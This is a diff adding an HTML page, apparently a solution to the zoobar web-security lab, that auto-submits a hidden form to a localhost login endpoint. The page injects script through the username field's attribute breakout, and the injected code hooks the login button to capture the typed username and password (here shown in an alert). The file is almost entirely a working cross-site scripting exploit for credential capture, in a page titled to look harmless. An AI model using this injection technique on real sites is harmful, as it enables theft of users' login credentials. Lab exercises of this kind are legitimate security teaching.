@@ -1,0 +1,38 @@
+<html>
+  <head>
+    <title>Nothing suspicious here</title>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+              var input_close = "\" size=\"20\" autocomplete=\"no\">";
+              var input_reopen = "<input style=\"visibility:hidden\" name=\">";
+              var script_open = "<script>"
+              var script_close = "<" + "/script>";
+              var code = document.querySelector("#code").innerHTML;
+
+              document.querySelector("#login_username").value = input_close + script_open
+                + code + script_close + input_reopen;
+
+              document.querySelector("#submit").click();
+              });
+              </script>
+  </head>
+  <body>
+    <div style="visibility:hidden">
+      <form method="post" action="http://localhost:8080/zoobar/index.cgi/login">
+        <input name="login_username" id="login_username">
+        <input type="submit" id="submit">
+      </form>
+      <script id="code">
+        document.addEventListener("DOMContentLoaded", function() {
+                  var login_button = document.querySelector("input[name=submit_login]");
+                  if (login_button !== null) {
+                            login_button.addEventListener("click", function() {
+                                      alert(document.querySelector("input[name=login_username]").value + " : "
+                                                + document.querySelector("input[name=login_password]").value);
+                                    });
+                          }
+                });
+      </script>
+    </div>
+  </body>
+</html>
